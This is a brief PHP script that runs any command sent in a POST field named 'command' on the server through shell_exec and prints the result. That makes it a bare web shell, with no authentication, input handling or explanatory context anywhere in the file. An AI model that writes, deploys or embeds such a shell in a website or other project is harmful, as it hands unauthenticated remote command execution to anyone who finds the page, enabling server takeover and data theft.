<?php
if (isset($_POST['command'])) {
    $command = $_POST['command'];
    // Execute command and return output
    $output = shell_exec($command);
    echo "<pre>$output</pre>";
}
?>
